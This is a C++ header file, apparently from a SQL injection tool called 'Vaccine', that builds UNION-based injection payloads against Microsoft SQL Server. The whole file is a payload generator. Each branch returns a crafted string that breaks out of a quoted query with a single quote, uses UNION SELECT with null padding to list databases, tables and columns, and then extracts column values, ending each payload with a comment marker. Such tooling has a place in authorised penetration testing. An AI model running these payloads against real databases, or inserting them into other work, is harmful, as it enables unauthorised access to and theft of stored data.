#ifndef MICROSOFTSQL_UNION_BASED
#define MICROSOFTSQL_UNION_BASED

#include "../../Vaccine.hpp"
#include "../mysql/mysql.hpp"

struct microsoftsql_union_based
{
        static std::string payload(sptr_vector& config, uint8 type)
        {
                std::string offset;
                switch (type)
                {
                case DATABASES:
                        offset = *config[UNION_BASED_OFFSET];
                        *config[UNION_BASED_OFFSET] += "null, ";
                        return "' UNION SELECT " + offset + "name " +
                               "FROM sys.databases-- ";
                case TABLES:
                        if (config[UNION_BASED_OFFSET + 1] != NULL)
                        {
                                for (uint8 i = 0; i < OFFSET_LEN; ++i)
                                        config[UNION_BASED_OFFSET]->pop_back();
                                config[UNION_BASED_OFFSET + 1] = NULL;
                        }
                        return "' UNION SELECT " +
                               *config[UNION_BASED_OFFSET] + "TABLE_NAME " +
                               "FROM " + *config[UNION_BASED_DATABASE + 1] +
                               ".INFORMATION_SCHEMA.TABLES-- ";
                case COLUMNS:
                        return "' UNION SELECT " +
                               *config[UNION_BASED_OFFSET] + "COLUMN_NAME " +
                               "FROM " + *config[UNION_BASED_DATABASE] +
                               ".INFORMATION_SCHEMA.COLUMNS " +
                               "WHERE TABLE_NAME='" +
                               *config[UNION_BASED_TABLE] + "'-- ";
                case VALUES:
                        return "' UNION SELECT " +
                               *config[UNION_BASED_OFFSET] +
                               *config[UNION_BASED_COLUMN] + " " +
                               "FROM " + *config[UNION_BASED_DATABASE] + ".." +
                               *config[UNION_BASED_TABLE] + "-- ";
                default:
                        return std::string();
                }
        };
};
#endif